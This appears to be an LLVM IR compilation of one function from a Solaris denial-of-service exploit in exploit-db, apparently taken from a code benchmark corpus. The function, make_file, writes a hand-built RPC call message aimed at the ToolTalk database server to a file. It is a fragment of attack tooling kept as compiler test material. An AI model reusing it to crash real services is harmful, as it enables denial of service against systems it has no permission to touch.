; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/dos/extr_19635.c_make_file.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/dos/extr_19635.c_make_file.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.rpc_msg = type { i32, %struct.TYPE_6__, i32 }
%struct.TYPE_6__ = type { i32, %struct.TYPE_5__, %struct.TYPE_4__, i32, i32, i32 }
%struct.TYPE_5__ = type { i64, i32*, i32 }
%struct.TYPE_4__ = type { i32, i8*, i32 }
%struct.authunix_parms = type { i8*, i32*, i64, i64, i64, i64 }

@MAX_AUTH_BYTES = common dso_local global i32 0, align 4
@O_RDWR = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@O_TRUNC = common dso_local global i32 0, align 4
@XDR_ENCODE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@FALSE = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [26 x i8] c"error encoding auth cred\0A\00", align 1
@CALL = common dso_local global i32 0, align 4
@TT_DBSERVER_PROG = common dso_local global i32 0, align 4
@TT_DBSERVER_VERS = common dso_local global i32 0, align 4
@_TT_P = common dso_local global i32 0, align 4
@AUTH_UNIX = common dso_local global i32 0, align 4
@AUTH_NONE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [27 x i8] c"error encoding rpc header\0A\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"error encoding rpc data\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"write\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @make_file(i8* %0, i8* %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.rpc_msg, align 8
  %11 = alloca %struct.authunix_parms, align 8
  %12 = alloca [64000 x i8], align 16
  %13 = alloca i8*, align 8
  %14 = alloca i64, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %15 = load i32, i32* @MAX_AUTH_BYTES, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %13, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %14, align 8
  %19 = load i32, i32* %6, align 4
  %20 = icmp eq i32 %19, 1
  br i1 %20, label %21, label %22

21:                                               ; preds = %3
  store i32 4, i32* %8, align 4
  br label %22

22:                                               ; preds = %21, %3
  %23 = load i8*, i8** %4, align 8
  %24 = load i32, i32* @O_RDWR, align 4
  %25 = load i32, i32* @O_CREAT, align 4
  %26 = or i32 %24, %25
  %27 = load i32, i32* @O_TRUNC, align 4
  %28 = or i32 %26, %27
  %29 = call i32 @open(i8* %23, i32 %28, i32 438)
  store i32 %29, i32* %7, align 4
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %31, label %35

31:                                               ; preds = %22
  %32 = load i8*, i8** %4, align 8
  %33 = call i32 @perror(i8* %32)
  %34 = call i32 @exit(i32 1) #4
  unreachable

35:                                               ; preds = %22
  %36 = trunc i64 %16 to i32
  %37 = load i32, i32* @XDR_ENCODE, align 4
  %38 = call i32 @xdrmem_create(i32* %9, i8* %18, i32 %36, i32 %37)
  %39 = call i64 @time(i32* null)
  %40 = getelementptr inbounds %struct.authunix_parms, %struct.authunix_parms* %11, i32 0, i32 5
  store i64 %39, i64* %40, align 8
  %41 = getelementptr inbounds %struct.authunix_parms, %struct.authunix_parms* %11, i32 0, i32 0
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8** %41, align 8
  %42 = getelementptr inbounds %struct.authunix_parms, %struct.authunix_parms* %11, i32 0, i32 4
  store i64 0, i64* %42, align 8
  %43 = getelementptr inbounds %struct.authunix_parms, %struct.authunix_parms* %11, i32 0, i32 3
  store i64 0, i64* %43, align 8
  %44 = getelementptr inbounds %struct.authunix_parms, %struct.authunix_parms* %11, i32 0, i32 2
  store i64 0, i64* %44, align 8
  %45 = getelementptr inbounds %struct.authunix_parms, %struct.authunix_parms* %11, i32 0, i32 1
  store i32* null, i32** %45, align 8
  %46 = call i64 @xdr_authunix_parms(i32* %9, %struct.authunix_parms* %11)
  %47 = load i64, i64* @FALSE, align 8
  %48 = icmp eq i64 %46, %47
  br i1 %48, label %49, label %52

49:                                               ; preds = %35
  %50 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0))
  %51 = call i32 @exit(i32 1) #4
  unreachable

52:                                               ; preds = %35
  %53 = call i32 @xdr_getpos(i32* %9)
  %54 = getelementptr inbounds %struct.rpc_msg, %struct.rpc_msg* %10, i32 0, i32 1
  %55 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %54, i32 0, i32 2
  %56 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %55, i32 0, i32 0
  store i32 %53, i32* %56, align 8
  %57 = call i32 @xdr_destroy(i32* %9)
  %58 = getelementptr inbounds [64000 x i8], [64000 x i8]* %12, i64 0, i64 0
  %59 = getelementptr inbounds i8, i8* %58, i64 4
  %60 = load i32, i32* @XDR_ENCODE, align 4
  %61 = call i32 @xdrmem_create(i32* %9, i8* %59, i32 64000, i32 %60)
  %62 = getelementptr inbounds %struct.rpc_msg, %struct.rpc_msg* %10, i32 0, i32 0
  store i32 305419896, i32* %62, align 8
  %63 = load i32, i32* @CALL, align 4
  %64 = getelementptr inbounds %struct.rpc_msg, %struct.rpc_msg* %10, i32 0, i32 2
  store i32 %63, i32* %64, align 8
  %65 = getelementptr inbounds %struct.rpc_msg, %struct.rpc_msg* %10, i32 0, i32 1
  %66 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %65, i32 0, i32 0
  store i32 2, i32* %66, align 8
  %67 = load i32, i32* @TT_DBSERVER_PROG, align 4
  %68 = getelementptr inbounds %struct.rpc_msg, %struct.rpc_msg* %10, i32 0, i32 1
  %69 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %68, i32 0, i32 5
  store i32 %67, i32* %69, align 8
  %70 = load i32, i32* @TT_DBSERVER_VERS, align 4
  %71 = getelementptr inbounds %struct.rpc_msg, %struct.rpc_msg* %10, i32 0, i32 1
  %72 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %71, i32 0, i32 4
  store i32 %70, i32* %72, align 4
  %73 = load i32, i32* @_TT_P, align 4
  %74 = getelementptr inbounds %struct.rpc_msg, %struct.rpc_msg* %10, i32 0, i32 1
  %75 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %74, i32 0, i32 3
  store i32 %73, i32* %75, align 8
  %76 = load i32, i32* @AUTH_UNIX, align 4
  %77 = getelementptr inbounds %struct.rpc_msg, %struct.rpc_msg* %10, i32 0, i32 1
  %78 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %77, i32 0, i32 2
  %79 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %78, i32 0, i32 2
  store i32 %76, i32* %79, align 8
  %80 = getelementptr inbounds %struct.rpc_msg, %struct.rpc_msg* %10, i32 0, i32 1
  %81 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %80, i32 0, i32 2
  %82 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %81, i32 0, i32 1
  store i8* %18, i8** %82, align 8
  %83 = load i32, i32* @AUTH_NONE, align 4
  %84 = getelementptr inbounds %struct.rpc_msg, %struct.rpc_msg* %10, i32 0, i32 1
  %85 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %84, i32 0, i32 1
  %86 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %85, i32 0, i32 2
  store i32 %83, i32* %86, align 8
  %87 = getelementptr inbounds %struct.rpc_msg, %struct.rpc_msg* %10, i32 0, i32 1
  %88 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %87, i32 0, i32 1
  %89 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %88, i32 0, i32 1
  store i32* null, i32** %89, align 8
  %90 = getelementptr inbounds %struct.rpc_msg, %struct.rpc_msg* %10, i32 0, i32 1
  %91 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %90, i32 0, i32 1
  %92 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %91, i32 0, i32 0
  store i64 0, i64* %92, align 8
  %93 = call i64 @xdr_callmsg(i32* %9, %struct.rpc_msg* %10)
  %94 = load i64, i64* @FALSE, align 8
  %95 = icmp eq i64 %93, %94
  br i1 %95, label %96, label %99

96:                                               ; preds = %52
  %97 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0))
  %98 = call i32 @exit(i32 1) #4
  unreachable

99:                                               ; preds = %52
  %100 = call i64 @xdr_wrapstring(i32* %9, i8** %5)
  %101 = load i64, i64* @FALSE, align 8
  %102 = icmp eq i64 %100, %101
  br i1 %102, label %103, label %106

103:                                              ; preds = %99
  %104 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0))
  %105 = call i32 @exit(i32 1) #4
  unreachable

106:                                              ; preds = %99
  %107 = call i32 @xdr_getpos(i32* %9)
  %108 = or i32 -2147483648, %107
  %109 = getelementptr inbounds [64000 x i8], [64000 x i8]* %12, i64 0, i64 0
  %110 = bitcast i8* %109 to i32*
  store i32 %108, i32* %110, align 16
  %111 = load i32, i32* %7, align 4
  %112 = getelementptr inbounds [64000 x i8], [64000 x i8]* %12, i64 0, i64 0
  %113 = load i32, i32* %8, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = call i32 @xdr_getpos(i32* %9)
  %117 = add nsw i32 %116, 4
  %118 = call i32 @write(i32 %111, i8* %115, i32 %117)
  %119 = icmp eq i32 %118, -1
  br i1 %119, label %120, label %123

120:                                              ; preds = %106
  %121 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %122 = call i32 @exit(i32 1) #4
  unreachable

123:                                              ; preds = %106
  %124 = call i32 @xdr_destroy(i32* %9)
  %125 = load i32, i32* %7, align 4
  %126 = call i32 @close(i32 %125)
  %127 = load i8*, i8** %13, align 8
  call void @llvm.stackrestore(i8* %127)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @open(i8*, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @xdrmem_create(i32*, i8*, i32, i32) #2

declare dso_local i64 @time(i32*) #2

declare dso_local i64 @xdr_authunix_parms(i32*, %struct.authunix_parms*) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @xdr_getpos(i32*) #2

declare dso_local i32 @xdr_destroy(i32*) #2

declare dso_local i64 @xdr_callmsg(i32*, %struct.rpc_msg*) #2

declare dso_local i64 @xdr_wrapstring(i32*, i8**) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
